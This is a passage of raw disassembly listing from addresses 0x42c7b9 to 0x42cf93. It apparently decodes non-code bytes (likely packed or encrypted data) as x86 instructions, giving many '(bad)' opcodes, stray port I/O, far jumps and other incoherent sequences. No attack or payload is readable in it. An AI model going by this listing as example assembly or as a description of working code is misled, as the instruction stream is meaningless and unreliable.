  42c7b9:	or     DWORD PTR [ebx],eax
  42c7bb:	add    dl,BYTE PTR [edx]
  42c7bd:	in     eax,0xe5
  42c7bf:	icebp  
  42c7c0:	shr    ebx,1
  42c7c2:	aam    0xeb
  42c7c4:	out    dx,al
  42c7c5:	int3   
  42c7c6:	repnz repz imul ch
  42c7ca:	in     eax,dx
  42c7cb:	cmc    
  42c7cc:	mov    cl,0xfd
  42c7ce:	lock int3 
  42c7d0:	fnsave [ebp+ebx*8-0xf03fb3c]
  42c7d7:	dec    bl
  42c7d9:	(bad)  
  42c7da:	std    
  42c7db:	jmp    0xebb1:0xc1ee03e6
  42c7e2:	(bad)  
  42c7e3:	sti    
  42c7e4:	rcl    esi,1
  42c7e6:	fcom   st(7)
  42c7e8:	xlat   BYTE PTR ds:[ebx]
  42c7e9:	cli    
  42c7ea:	leave  
  42c7eb:	jmp    0xe206:0xeddefedf
  42c7f2:	hlt    
  42c7f3:	(bad)  
  42c7f5:	retf   0xfc1
  42c7f8:	in     eax,0xc7
  42c7fa:	retf   0xdfde
  42c7fd:	out    dx,al
  42c7fe:	out    0xe2,eax
  42c800:	(bad)  
  42c801:	repnz aam 0xcb
  42c804:	out    0xac,eax
  42c806:	out    0xff,eax
  42c808:	out    0xf2,eax
  42c80a:	iret   
  42c80b:	mov    edx,0xdceeeae2
  42c810:	icebp  
  42c811:	inc    BYTE PTR [ecx]
  42c813:	clc    
  42c814:	fucomip st,st(1)
  42c816:	fcompp 
  42c818:	test   DWORD PTR [ebx],0xee09ca00
  42c81e:	rcl    ecx,cl
  42c820:	shl    ebp,1
  42c822:	loope  0x42c809
  42c824:	jmp    0x42c7f6
  42c826:	jmp    0x42c816
  42c828:	stc    
  42c829:	(bad)
  42c82d:	clc    
  42c82e:	faddp  st(2),st
  42c830:	rol    edi,1
  42c832:	pop    es
  42c833:	les    eax,FWORD PTR [edx]
  42c835:	inc    DWORD PTR [eax]
  42c837:	(bad)
  42c83a:	aam    0xc
  42c83c:	(bad)  [eax]
  42c83e:	retf   0xe4d3
  42c841:	test   ah,0xe9
  42c844:	shl    ah,0xba
  42c847:	fcom   st(2)
  42c849:	(bad)
  42c84c:	call   0xc8138725
  42c851:	aam    0xf9
  42c853:	hlt    
  42c854:	mov    ebp,0xe7d7c0e7
  42c859:	or     ecx,DWORD PTR [edi]
  42c85b:	out    dx,eax
  42c85c:	pop    es
  42c85d:	fpatan 
  42c85f:	rol    esi,0xac
  42c862:	retf   0xcff1
  42c865:	rcl    bl,1
  42c867:	f2xm1  
  42c869:	fnstcw WORD PTR [edi-0x26223542]
  42c86f:	into   
  42c870:	(bad)  
  42c871:	mov    ah,0xd9
  42c873:	mov    esi,0x7e8fefa
  42c878:	cld    
  42c879:	jmp    0xe455b344
  42c87e:	jmp    0x42c84b
  42c880:	mov    bl,0xd7
  42c882:	ret    0xf1c7
  42c885:	lods   al,BYTE PTR ds:[esi]
  42c886:	retf   
  42c887:	(bad)  
  42c888:	(bad)  
  42c889:	in     eax,0xf6
  42c88b:	cli    
  42c88c:	mov    ebp,0xddffc8fd
  42c891:	rol    cl,cl
  42c893:	repz retf 
  42c895:	fcomi  st,st(0)
  42c897:	hlt    
  42c898:	std    
  42c899:	push   es
  42c89a:	in     al,dx
  42c89b:	fsubp  st(1),st
  42c89d:	add    cl,dh
  42c89f:	in     al,dx
  42c8a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c8a1:	icebp  
  42c8a2:	mov    ch,0xcc
  42c8a4:	hlt    
  42c8a5:	int3   
  42c8a6:	(bad)  
  42c8a7:	fcomip st,st(5)
  42c8a9:	mov    edx,0xede2b2b7
  42c8ae:	aam    0xce
  42c8b0:	mul    eax
  42c8b2:	aam    0xcc
  42c8b4:	shl    edi,cl
  42c8b6:	jmp    0xde01:0xd5dd04df
  42c8bd:	fsub   st,st(7)
  42c8bf:	rcl    bh,0xc6
  42c8c2:	jmp    0xfbd2:0xf6fac5d0
  42c8c9:	enter  0xf8b4,0xe2
  42c8cd:	mov    eax,0xdafdf9f5
  42c8d2:	loope  0x42c8a7
  42c8d4:	rol    edi,cl
  42c8d6:	(bad)  
  42c8d8:	or     dh,ch
  42c8da:	or     ebp,esp
  42c8dc:	in     eax,0xda
  42c8de:	leave  
  42c8df:	mov    ebp,0xc0d4c5e7
  42c8e4:	div    al
  42c8e6:	hlt    
  42c8e7:	shl    al,1
  42c8e9:	in     al,0xba
  42c8eb:	(bad)  
  42c8ed:	mov    esi,0x6e0e3d0
  42c8f2:	faddp  st(3),st
  42c8f4:	add    bl,ch
  42c8f6:	add    al,0xd7
  42c8f8:	cli    
  42c8f9:	cmc    
  42c8fa:	(bad)  
  42c8fd:	stc    
  42c8fe:	mov    ebp,0xf3dcbdae
  42c903:	int3   
  42c904:	les    esi,FWORD PTR [edi-0x40061b40]
  42c90a:	sti    
  42c90b:	aad    0xba
  42c90d:	mov    edx,0xfebc02db
  42c912:	hlt    
  42c913:	aam    0x4
  42c915:	mov    DWORD PTR [edi],0xdffd4f4
  42c91b:	add    edi,ebp
  42c91d:	adc    esp,ecx
  42c91f:	enter  0xf0ef,0xab
  42c923:	mov    dh,0xcb
  42c925:	enter  0xcff4,0xda
  42c929:	(bad)
  42c92c:	test   BYTE PTR [edx],0xdc
  42c92f:	repnz fiadd DWORD PTR [edi]
  42c932:	loop   0x42c93a
  42c934:	test   ch,0xfa
  42c937:	lock retf 
  42c939:	loop   0x42c900
  42c93b:	in     al,0xda
  42c93d:	stc    
  42c93e:	retf   0xbdc7
  42c941:	repz mov dh,0xcc
  42c944:	(bad)  
  42c945:	aam    0xd7
  42c947:	(bad)  
  42c948:	out    dx,al
  42c949:	clc    
  42c94a:	mov    bh,0xcc
  42c94c:	test   cl,0xc1
  42c94f:	mov    esp,0xbe1ffe6
  42c954:	jecxz  0x42c933
  42c956:	dec    cl
  42c958:	(bad)  
  42c95a:	iret   
  42c95b:	(bad)  
  42c95d:	shr    DWORD PTR [ecx-0x2910291d],cl
  42c963:	repz mov cl,0xd1
  42c966:	in     eax,dx
  42c967:	stc    
  42c968:	call   0xc026c556
  42c96d:	hlt    
  42c96e:	div    bh
  42c970:	stc    
  42c971:	test   BYTE PTR [eax],0xf2
  42c974:	cli    
  42c975:	repnz rcl ah,0xc8
  42c979:	add    al,0xea
  42c97b:	lds    edx,FWORD PTR [ebx]
  42c97d:	out    dx,al
  42c97e:	jmp    0x42c968
  42c980:	mov    ebp,0xb6aacae3
  42c985:	div    al
  42c987:	scas   al,BYTE PTR es:[edi]
  42c988:	(bad)  
  42c98b:	mov    ebx,0xe3d7d4d4
  42c990:	out    0xe6,eax
  42c992:	lock fiadd WORD PTR [edi]
  42c995:	push   es
  42c996:	fiadd  DWORD PTR [eax]
  42c998:	retf   0xe303
  42c99b:	cld    
  42c99c:	jmp    0xf3e5:0xd2a6d0dd
  42c9a3:	(bad)  
  42c9a4:	leave  
  42c9a5:	into   
  42c9a6:	fisubr DWORD PTR [esi-0x733344c]
  42c9ac:	(bad)  
  42c9ae:	out    dx,al
  42c9af:	(bad)  
  42c9b0:	mov    ebp,0xf8d400e5
  42c9b5:	cld    
  42c9b6:	fsqrt  
  42c9b8:	fndisi(8087 only) 
  42c9ba:	in     al,0xd8
  42c9bc:	dec    BYTE PTR [ebx]
  42c9be:	stos   DWORD PTR es:[edi],eax
  42c9bf:	in     eax,dx
  42c9c0:	fsubrp st(1),st
  42c9c2:	loop   0x42c96e
  42c9c4:	mov    bh,0xc4
  42c9c6:	iret   
  42c9c7:	div    DWORD PTR [esi-0x23362717]
  42c9cd:	cld    
  42c9ce:	into   
  42c9cf:	mov    edx,0xf0ff02ef
  42c9d4:	hlt    
  42c9d5:	mul    esi
  42c9d7:	add    eax,0xc2e0bccb
  42c9dc:	(bad)  
  42c9df:	imul   edi
  42c9e1:	out    dx,eax
  42c9e2:	cmc    
  42c9e3:	repnz in al,0xe8
  42c9e6:	repz out dx,eax
  42c9e8:	fdivr  DWORD PTR [edi-0x312d1c13]
  42c9ee:	call   0xd14689ad
  42c9f3:	int3   
  42c9f4:	(bad)  
  42c9f6:	retf   
  42c9f7:	retf   0xdbd4
  42c9fa:	or     ah,al
  42c9fc:	or     cl,bh
  42c9fe:	lock mov ebp,0xd7ecc6c6
  42ca04:	leave  
  42ca05:	loopne 0x42c9ce
  42ca07:	(bad)  
  42ca08:	in     eax,0xb5
  42ca0a:	in     al,0xbe
  42ca0c:	loop   0x42c9dd
  42ca0e:	mov    ecx,0xdc06c0b6
  42ca13:	loop   0x42ca0c
  42ca15:	repnz rol BYTE PTR [edi],0xd7
  42ca19:	add    ecx,DWORD PTR [edi]
  42ca1b:	in     eax,0xe2
  42ca1d:	or     al,0xce
  42ca1f:	iret   
  42ca20:	enter  0xf7bd,0xd3
  42ca24:	(bad)  
  42ca25:	aam    0xe1
  42ca27:	shl    edx,1
  42ca29:	in     al,dx
  42ca2a:	fsubr  st(4),st
  42ca2c:	not    ebp
  42ca2e:	jecxz  0x42ca33
  42ca30:	out    0xdf,al
  42ca32:	(bad)  
  42ca33:	not    cl
  42ca35:	in     al,0x2
  42ca37:	(bad)  
  42ca39:	out    0xee,eax
  42ca3b:	leave  
  42ca3c:	fsubp  st(3),st
  42ca3e:	in     al,0xd0
  42ca40:	test   al,0xc0
  42ca42:	xlat   BYTE PTR ds:[ebx]
  42ca43:	scas   al,BYTE PTR es:[edi]
  42ca44:	out    dx,al
  42ca45:	rcr    al,1
  42ca47:	int    0xef
  42ca49:	jmp    0x42ca23
  42ca4b:	iret   
  42ca4c:	retf   0xe0f9
  42ca4f:	rol    BYTE PTR [ebx],0xf5
  42ca52:	loop   0x42ca1a
  42ca54:	clc    
  42ca55:	(bad)  
  42ca56:	std    
  42ca57:	xlat   BYTE PTR ds:[ebx]
  42ca58:	hlt    
  42ca59:	(bad)  
  42ca5a:	out    0xcd,al
  42ca5c:	adc    ebp,edi
  42ca5e:	jmp    0xc50e7b28
  42ca63:	icebp  
  42ca64:	jmp    0xfcf1:0xf0eef9e5
  42ca6b:	in     al,dx
  42ca6c:	sar    DWORD PTR [ebp-0x4b320f30],cl
  42ca72:	rol    ebp,1
  42ca74:	jmp    0xefee:0xd4d6ca07
  42ca7b:	fst    DWORD PTR [edx]
  42ca7d:	fcmove st,st(6)
  42ca7f:	iret   
  42ca80:	repz test al,0xd5
  42ca83:	hlt    
  42ca84:	(bad)  
  42ca85:	retf   0xf1cb
  42ca88:	mov    al,0xf2
  42ca8a:	mov    edx,0xedfbc3d8
  42ca8f:	in     al,dx
  42ca90:	add    BYTE PTR [esi-0x2d0c2e23],bh
  42ca96:	les    ecx,FWORD PTR [edx]
  42ca98:	(bad)  
  42ca99:	cld    
  42ca9a:	iret   
  42ca9b:	repz add BYTE PTR [ecx],al
  42ca9e:	fsubp  st(7),st
  42caa0:	icebp  
  42caa1:	enter  0xc3ad,0xea
  42caa5:	ror    ebp,1
  42caa7:	test   edi,0xebf0f7cf
  42caad:	std    
  42caae:	mov    eax,0xdbfdc2b8
  42cab3:	add    eax,0xc5f5f0c0
  42cab8:	xlat   BYTE PTR ds:[ebx]
  42cab9:	or     BYTE PTR [esp+edx*8],cl
  42cabc:	push   es
  42cabd:	retf   
  42cabe:	retf   
  42cabf:	loope  0x42caad
  42cac1:	jmp    0x42caab
  42cac3:	in     al,dx
  42cac4:	shl    BYTE PTR [esi+eiz*8-0x103a3835],cl
  42cacb:	shl    BYTE PTR [ecx-0x62b270a],1
  42cad1:	out    0x4,al
  42cad3:	(bad)  
  42cad4:	mov    ebp,0xe5fad7f2
  42cad9:	sti    
  42cada:	loop   0x42caef
  42cadc:	push   cs
  42cadd:	cld    
  42cade:	lock jmp 0xb3257dcf
  42cae4:	loopne 0x42ca96
  42cae6:	hlt    
  42cae7:	fcmove st,st(6)
  42cae9:	(bad)  
  42caea:	(bad)
  42caed:	cld    
  42caee:	leave  
  42caef:	(bad)  
  42caf1:	mov    dh,0xfa
  42caf4:	rcr    dl,cl
  42caf6:	add    edx,ecx
  42caf8:	in     eax,0xce
  42cafa:	hlt    
  42cafb:	loope  0x42cb0f
  42cafd:	fsub   st,st(2)
  42caff:	xlat   BYTE PTR ds:[ebx]
  42cb00:	ret    0xb6c2
  42cb03:	out    dx,al
  42cb04:	repnz (bad) 
  42cb06:	clc    
  42cb07:	shr    bl,cl
  42cb09:	into   
  42cb0a:	mov    ecx,0xb8f002ed
  42cb0f:	jecxz  0x42cb03
  42cb11:	ret    
  42cb12:	add    al,BYTE PTR [edi]
  42cb14:	dec    edx
  42cb16:	ret    
  42cb17:	add    DWORD PTR [edi],ecx
  42cb19:	add    cl,BYTE PTR [ecx]
  42cb1b:	jecxz  0x42cb08
  42cb1d:	add    al,0xe2
  42cb1f:	into   
  42cb20:	mov    esp,0xb1e2e9d2
  42cb25:	out    0xb9,eax
  42cb27:	mov    ecx,0xf7fef6d6
  42cb2c:	rol    DWORD PTR [ebx],cl
  42cb2e:	call   0x822ba08
  42cb33:	in     al,dx
  42cb34:	mov    ebp,0xf6ddc6c7
  42cb39:	cli    
  42cb3a:	stc    
  42cb3b:	int3   
  42cb3c:	stc    
  42cb3d:	or     eax,0xaec8efe0
  42cb42:	lods   al,BYTE PTR ds:[esi]
  42cb43:	out    dx,eax
  42cb44:	int3   
  42cb45:	in     al,0xc4
  42cb47:	scas   al,BYTE PTR es:[edi]
  42cb48:	leave  
  42cb49:	(bad)  
  42cb4a:	mov    esi,0xf9b0bbfa
  42cb4f:	loopne 0x42cb48
  42cb51:	add    bl,ah
  42cb53:	xlat   BYTE PTR ds:[ebx]
  42cb54:	cmc    
  42cb55:	mov    eax,0xddec2da
  42cb5a:	add    eax,0xaae4c5fb
  42cb5f:	loopne 0x42cb21
  42cb61:	repnz in eax,dx
  42cb63:	mov    ch,0xcf
  42cb65:	into   
  42cb66:	mov    bl,0xd2
  42cb68:	call   0xb627a23e
  42cb6d:	int    0xc2
  42cb6f:	rol    cl,cl
  42cb71:	(bad)  
  42cb72:	pop    es
  42cb73:	std    
  42cb74:	std    
  42cb75:	ret    0xe5e9
  42cb78:	sti    
  42cb79:	out    dx,eax
  42cb7a:	or     eax,0xe80afcce
  42cb7f:	mov    esi,0xf3ead5e0
  42cb84:	xlat   BYTE PTR ds:[ebx]
  42cb85:	int3   
  42cb86:	(bad)
  42cb89:	cli    
  42cb8a:	fcmovnu st,st(5)
  42cb8c:	sar    DWORD PTR [edi+0x5d9fdd2],1
  42cb92:	fdecstp 
  42cb94:	test   BYTE PTR [ecx],0xdf
  42cb97:	mov    esi,0xd9fa02cf
  42cb9c:	loope  0x42cb66
  42cb9e:	loope  0x42cb5d
  42cba0:	mov    dl,0xf1
  42cba2:	out    dx,al
  42cba3:	mov    bl,0xa9
  42cba5:	repnz fnstenv [ebp-0x4a4c0a3a]
  42cbac:	neg    al
  42cbae:	iret   
  42cbaf:	fdivr  QWORD PTR [ebp-0x2cff1c19]
  42cbb5:	fdivr  st(4),st
  42cbb7:	add    DWORD PTR [ecx],ecx
  42cbb9:	or     esp,esp
  42cbbb:	iret   
  42cbbc:	repnz icebp 
  42cbbe:	shl    esp,0xbf
  42cbc1:	shl    BYTE PTR [edi-0x1f111211],0xe9
  42cbc8:	mov    edi,0xcfe3ced6
  42cbcd:	leave  
  42cbce:	mov    eax,0xecdad802
  42cbd3:	add    ah,dh
  42cbd5:	or     dh,ah
  42cbd7:	call   0xe02f9ad2
  42cbdc:	out    0xfc,eax
  42cbde:	fadd   st,st(0)
  42cbe0:	out    dx,al
  42cbe1:	test   al,0xcc
  42cbe3:	out    dx,eax
  42cbe4:	fld    TBYTE PTR [esp+eax*8-0xb0b4739]
  42cbeb:	neg    esi
  42cbed:	(bad)  
  42cbee:	int3   
  42cbef:	ret    0x5cd
  42cbf2:	repnz fdivr st(7),st
  42cbf5:	idiv   ecx
  42cbf7:	fcmove st,st(7)
  42cbf9:	add    cl,ah
  42cbfb:	call   0xe232de13
  42cc00:	mov    esp,0xb6c8ade2
  42cc05:	loop   0x42cbd0
  42cc07:	vshufps ymm3,ymm7,ymm6,0xe3
  42cc0c:	fidiv  WORD PTR [ecx+esi*8-0xa20ff2b]
  42cc13:	jecxz  0x42cbf7
  42cc15:	add    BYTE PTR [ecx],cl
  42cc17:	lock (bad) 
  42cc1a:	push   cs
  42cc1b:	or     al,0xdf
  42cc1d:	jecxz  0x42cc07
  42cc1f:	ret    0xada9
  42cc22:	enter  0xeaef,0xe7
  42cc26:	(bad)  
  42cc27:	fcomi  st,st(4)
  42cc29:	(bad)  
  42cc2b:	fcom   st(2)
  42cc2d:	sti    
  42cc2e:	add    bh,dh
  42cc30:	fsub   st,st(1)
  42cc32:	stc    
  42cc33:	in     al,0xfa
  42cc35:	aad    0xe7
  42cc37:	call   0xed37c813
  42cc3c:	stc    
  42cc3d:	std    
  42cc3e:	loope  0x42cc02
  42cc40:	shl    cl,1
  42cc42:	out    0xc8,al
  42cc44:	jmp    0xd635860a
  42cc49:	hlt    
  42cc4a:	les    edi,FWORD PTR [ebx-0x3127442e]
  42cc50:	shr    dh,cl
  42cc52:	sti    
  42cc53:	push   es
  42cc54:	jmp    0x42cc3a
  42cc56:	jmp    0xfae0:0xd8c5d6c9
  42cc5d:	retf   0xd1d2
  42cc60:	iret   
  42cc61:	into   
  42cc62:	mov    bl,0xf0
  42cc64:	jmp    0xca08a537
  42cc69:	out    dx,eax
  42cc6a:	hlt    
  42cc6b:	call   0xfcc28
  42cc70:	icebp  
  42cc71:	cli    
  42cc72:	loop   0x42cc48
  42cc74:	stc    
  42cc75:	mov    DWORD PTR [ecx],0xe9c6eae3
  42cc7b:	cld    
  42cc7c:	rcl    edx,cl
  42cc7e:	int3   
  42cc7f:	in     eax,0xa8
  42cc81:	not    cl
  42cc83:	rcr    bl,0xd2
  42cc86:	in     eax,dx
  42cc87:	loopne 0x42cc59
  42cc89:	(bad)  
  42cc8b:	sar    BYTE PTR [ebp-0x23022a0e],1
  42cc91:	fcmovnu st,st(0)
  42cc93:	fcomi  st,st(6)
  42cc95:	fcmovnu st,st(3)
  42cc97:	out    dx,eax
  42cc98:	stc    
  42cc99:	push   cs
  42cc9a:	into   
  42cc9b:	cli    
  42cc9c:	or     al,0xe4
  42cc9e:	mov    esp,0xc6c3c6cd
  42cca3:	int3   
  42cca4:	out    dx,eax
  42cca5:	test   ch,0xd8
  42cca8:	out    dx,eax
  42cca9:	jmp    0xbe30c7ab
  42ccae:	add    dh,bl
  42ccb0:	icebp  
  42ccb1:	(bad)  
  42ccb3:	loop   0x42cc8c
  42ccb5:	hlt    
  42ccb6:	add    ch,bh
  42ccb8:	cld    
  42ccb9:	add    eax,0xe3cf0e08
  42ccbe:	repnz test al,0xee
  42ccc1:	xlat   BYTE PTR ds:[ebx]
  42ccc2:	jmp    0xdfdf:0xc0d9e6b5
  42ccc9:	retf   0xdbf8
  42cccc:	mov    ch,0xed
  42ccce:	mov    ebx,0xded0d0d5
  42ccd3:	(bad)  
  42ccd5:	mov    eax,0xd9dfc702
  42ccda:	enter  0xe8c4,0xa
  42ccde:	into   
  42ccdf:	loop   0x42ccc2
  42cce1:	loopne 0x42cccf
  42cce3:	loope  0x42cca6
  42cce5:	out    dx,al
  42cce6:	stc    
  42cce7:	int3   
  42cce8:	dec    esi
  42ccea:	not    eax
  42ccec:	cmc    
  42cced:	std    
  42ccee:	cld    
  42ccef:	mov    edi,0xfbd3c3fa
  42ccf4:	retf   
  42ccf5:	add    DWORD PTR [edx],eax
  42ccf7:	or     DWORD PTR [esi],eax
  42ccf9:	fmul   QWORD PTR [esi]
  42ccfb:	(bad)  
  42ccfd:	fld    st(1)
  42ccff:	mov    al,0xed
  42cd01:	into   
  42cd02:	out    dx,al
  42cd03:	cmc    
  42cd04:	lods   al,BYTE PTR ds:[esi]
  42cd05:	(bad)  
  42cd08:	fcmovnbe st,st(3)
  42cd0a:	mov    ebx,0xf4bcecf0
  42cd0f:	mov    edi,0xfee3f600
  42cd14:	out    0xea,eax
  42cd16:	sti    
  42cd17:	(bad)  
  42cd18:	call   0xdc17badd
  42cd1d:	or     BYTE PTR [edx+esi*8-0x37174e3a],ch
  42cd24:	mov    ah,0xee
  42cd26:	repnz int 0xb8
  42cd29:	sar    dl,1
  42cd2b:	retf   0xcaf0
  42cd2e:	add    ebx,eax
  42cd30:	in     al,dx
  42cd31:	in     eax,dx
  42cd32:	call   esi
  42cd34:	lds    edi,FWORD PTR [edi+eax*8+0xc8fb08]
  42cd3b:	inc    DWORD PTR [ecx]
  42cd3d:	int    0xe3
  42cd3f:	shl    edi,1
  42cd41:	shl    DWORD PTR [ebp-0x36240c4f],cl
  42cd47:	shl    BYTE PTR [edi+esi*4-0x13350b01],1
  42cd4e:	add    eax,DWORD PTR [edx]
  42cd50:	cli    
  42cd51:	mov    esi,0xf0d000df
  42cd56:	shl    ch,1
  42cd58:	add    al,0xe0
  42cd5a:	or     eax,DWORD PTR [edi]
  42cd5c:	cld    
  42cd5d:	in     eax,dx
  42cd5e:	into   
  42cd5f:	mov    eax,0xccd4f3ae
  42cd64:	mov    bh,0xf2
  42cd66:	repnz (bad) 
  42cd68:	frstpm(287 only) 
  42cd6a:	(bad)  
  42cd6b:	hlt    
  42cd6c:	cld    
  42cd6d:	cli    
  42cd6e:	cli    
  42cd6f:	aam    0xf0
  42cd71:	int    0xc7
  42cd73:	fild   WORD PTR [ebx+eax*8]
  42cd76:	add    edi,esp
  42cd78:	(bad)  
  42cd79:	dec    esi
  42cd7b:	ret    0xfacc
  42cd7e:	in     eax,dx
  42cd7f:	(bad)  
  42cd81:	fsub   st(6),st
  42cd83:	ret    0xd4f6
  42cd86:	repnz mov ah,0xcf
  42cd89:	in     eax,0xe4
  42cd8b:	fmul   st(2),st
  42cd8d:	mov    ebx,0xf4d4f5d6
  42cd92:	clc    
  42cd93:	or     esi,ecx
  42cd95:	jmp    0xbc8:0xcbdfe803
  42cd9c:	sti    
  42cd9d:	shl    dl,cl
  42cd9f:	shr    ebx,0xb7
  42cda2:	ror    ebp,cl
  42cda4:	cmc    
  42cda5:	lods   al,BYTE PTR ds:[esi]
  42cda6:	lock (bad) 
  42cda8:	ror    ecx,cl
  42cdaa:	rcl    ebx,1
  42cdac:	loop   0x42cda5
  42cdae:	fmul   st,st(6)
  42cdb0:	push   es
  42cdb1:	fld    QWORD PTR [eax]
  42cdb3:	fdivr  st,st(7)
  42cdb5:	mov    eax,0xcee4e2fd
  42cdba:	sti    
  42cdbb:	add    esi,esp
  42cdbd:	add    bl,cl
  42cdbf:	les    esi,FWORD PTR [eax-0x1f041c3f]
  42cdc5:	mov    al,0xc4
  42cdc7:	leave  
  42cdc8:	hlt    
  42cdc9:	mov    ch,0xe8
  42cdcb:	shr    al,1
  42cdcd:	add    ecx,edi
  42cdcf:	add    DWORD PTR [esi],eax
  42cdd1:	hlt    
  42cdd2:	loopne 0x42cdc5
  42cdd4:	(bad)  
  42cdd5:	jmp    0x352ac9e
  42cdda:	or     al,0xf
  42cddc:	add    al,0xdf
  42cdde:	leave  
  42cddf:	(bad)
  42cde3:	ror    bh,0xcc
  42cde6:	out    dx,al
  42cde7:	(bad)  
  42cde8:	out    0xdb,eax
  42cdea:	rol    DWORD PTR [ebx],cl
  42cdec:	int3   
  42cded:	loop   0x42cde3
  42cdef:	rcl    ebp,1
  42cdf1:	fsubrp st(1),st
  42cdf3:	stc    
  42cdf4:	fld    st(0)
  42cdf6:	(bad)  
  42cdf7:	(bad)  
  42cdf9:	add    bl,dl
  42cdfb:	in     eax,0xc1
  42cdfd:	pextrw edx,mm2,0xe7
  42ce01:	in     al,dx
  42ce02:	test   ebp,0xf3faede8
  42ce08:	mov    dh,0xd3
  42ce0a:	push   esp
  42ce0c:	shr    bh,cl
  42ce0e:	fidivr DWORD PTR [ecx-0x380af900]
  42ce14:	pop    es
  42ce15:	or     ecx,ebp
  42ce17:	hlt    
  42ce18:	fmul   DWORD PTR ds:0xf312f804
  42ce1e:	ret    0xbfef
  42ce21:	lods   eax,DWORD PTR ds:[esi]
  42ce22:	(bad)  
  42ce23:	idiv   edx
  42ce25:	mov    bl,0xd6
  42ce27:	(bad)  
  42ce28:	not    ebp
  42ce2a:	(bad)  
  42ce2b:	rcr    bh,1
  42ce2d:	cli    
  42ce2e:	(bad)  
  42ce30:	shl    ebp,1
  42ce32:	icebp  
  42ce33:	fmul   st,st(3)
  42ce35:	fisttp WORD PTR [edx]
  42ce37:	fisttp DWORD PTR [edi]
  42ce39:	pop    es
  42ce3a:	hlt    
  42ce3b:	sldt   WORD PTR [ebx]
  42ce3e:	shr    ebx,1
  42ce40:	(bad)  
  42ce42:	scas   al,BYTE PTR es:[edi]
  42ce43:	lods   eax,DWORD PTR ds:[esi]
  42ce44:	in     al,dx
  42ce45:	icebp  
  42ce46:	aad    0xc8
  42ce48:	mov    ch,0xe6
  42ce4a:	hlt    
  42ce4b:	jecxz  0x42ce17
  42ce4d:	cmc    
  42ce4e:	in     al,dx
  42ce4f:	faddp  st(0),st
  42ce51:	add    bh,bl
  42ce53:	mov    ebp,0x4e60201
  42ce58:	jecxz  0x42ce30
  42ce5a:	jmp    0xd7b3:0xf3cde9e3
  42ce61:	shr    edx,1
  42ce63:	mov    dh,0xee
  42ce65:	fidivr DWORD PTR [ebx-0x16064b52]
  42ce6b:	cmc    
  42ce6c:	aam    0xe9
  42ce6e:	sar    BYTE PTR [edi-0x202d2c13],cl
  42ce74:	fsubr  st(3),st
  42ce76:	(bad)  
  42ce78:	jecxz  0x42ce5b
  42ce7a:	fmul   DWORD PTR [ecx]
  42ce7c:	fdivp  st(5),st
  42ce7e:	test   eax,0xbccaaebc
  42ce83:	jmp    0x42ce35
  42ce85:	int3   
  42ce86:	hlt    
  42ce87:	sti    
  42ce88:	stc    
  42ce89:	(bad)  
  42ce8a:	in     al,dx
  42ce8b:	iret   
  42ce8c:	mov    ecx,0xedfac1ff
  42ce91:	jecxz  0x42ce58
  42ce93:	repnz pop es
  42ce95:	add    eax,0xc8fec707
  42ce9a:	add    eax,0xd9de0e0a
  42ce9f:	int    0xed
  42cea1:	jmp    0xc10f9c5b
  42cea6:	shl    DWORD PTR [ebp-0x49411125],1
  42ceac:	std    
  42cead:	cli    
  42ceae:	fcmovbe st,st(3)
  42ceb0:	mov    ebp,0xf9def1d4
  42ceb5:	hlt    
  42ceb6:	or     BYTE PTR [ebx],cl
  42ceb8:	enter  0xd8dc,0x0
  42cebc:	or     eax,0xe3c5d8ef
  42cec1:	out    dx,eax
  42cec2:	mov    bh,0xed
  42cec4:	shr    dh,cl
  42cec6:	int    0xdb
  42cec8:	aam    0xef
  42ceca:	in     al,dx
  42cecb:	test   dh,0xf9
  42cece:	int3   
  42cecf:	clc    
  42ced0:	repz lock add bh,ah
  42ced4:	out    0xf0,eax
  42ced6:	clc    
  42ced7:	or     ecx,ebp
  42ced9:	out    0xcf,eax
  42cedb:	cli    
  42cedc:	in     eax,0xc0
  42cede:	(bad)  
  42cedf:	retf   0xbdcf
  42cee2:	ret    0xc3c1
  42cee5:	int    0xe4
  42cee7:	sti    
  42cee8:	cmc    
  42cee9:	cli    
  42ceea:	mov    bl,0xd4
  42ceec:	fdivr  st,st(3)
  42ceee:	add    cl,bh
  42cef0:	fcmovbe st,st(4)
  42cef2:	xlat   BYTE PTR ds:[ebx]
  42cef3:	inc    eax
  42cef5:	jmp    0xccf:0xed05d8fa
  42cefc:	les    ecx,FWORD PTR [ebx]
  42cefe:	(bad)  
  42ceff:	test   al,0xa9
  42cf01:	in     eax,dx
  42cf02:	aad    0xdb
  42cf04:	mov    dl,0xd7
  42cf06:	call   0xc539adbc
  42cf0b:	mov    dh,0xed
  42cf0d:	out    dx,al
  42cf0e:	loopne 0x42cf02
  42cf10:	(bad)  
  42cf11:	rcr    ecx,1
  42cf13:	int3   
  42cf14:	fild   WORD PTR ds:0xf6d8f4d7
  42cf1a:	add    ecx,ebp
  42cf1c:	or     cl,bh
  42cf1e:	retf   0xe1f3
  42cf21:	lock scas al,BYTE PTR es:[edi]
  42cf23:	mov    ch,0xd5
  42cf25:	mov    bh,0xf2
  42cf27:	hlt    
  42cf28:	shl    edx,1
  42cf2a:	call   eax
  42cf2c:	add    dh,cl
  42cf2e:	repz stc 
  42cf30:	(bad)  
  42cf31:	ffreep st(6)
  42cf33:	mov    esp,0xf4fcd2fe
  42cf38:	out    0xf4,eax
  42cf3a:	fcompp 
  42cf3c:	(bad)
  42cf3f:	mov    esi,0xd0d2f7bd
  42cf44:	out    0xe1,al
  42cf46:	mov    bh,0xfa
  42cf48:	mov    edi,0xdadef2f8
  42cf4d:	std    
  42cf4e:	shl    bh,1
  42cf50:	fcomi  st,st(1)
  42cf52:	rcl    bh,0xfb
  42cf55:	mov    esp,0x5d4dbf6
  42cf5a:	or     eax,ebx
  42cf5c:	rcr    ecx,0xbf
  42cf5f:	leave  
  42cf60:	repz cmc 
  42cf62:	mov    dl,0xb1
  42cf64:	aam    0xf0
  42cf66:	mov    bh,0xb5
  42cf68:	ror    bh,1
  42cf6a:	icebp  
  42cf6b:	int    0xdb
  42cf6d:	add    esi,ebx
  42cf6f:	test   BYTE PTR [eax],0xe3
  42cf72:	xlat   BYTE PTR ds:[ebx]
  42cf73:	mov    esi,0xc206eac1
  42cf78:	in     eax,0x7
  42cf7a:	std    
  42cf7b:	ret    0xcdc
  42cf7e:	mov    ebp,0xacacb2f3
  42cf83:	mov    al,0xad
  42cf85:	hlt    
  42cf86:	rcl    al,cl
  42cf88:	in     eax,0xcb
  42cf8a:	int    0xea
  42cf8c:	jmp    0x42cf89
  42cf8e:	repnz enter 0xd8cc,0xdb
  42cf93:	rol    bh,0xd4
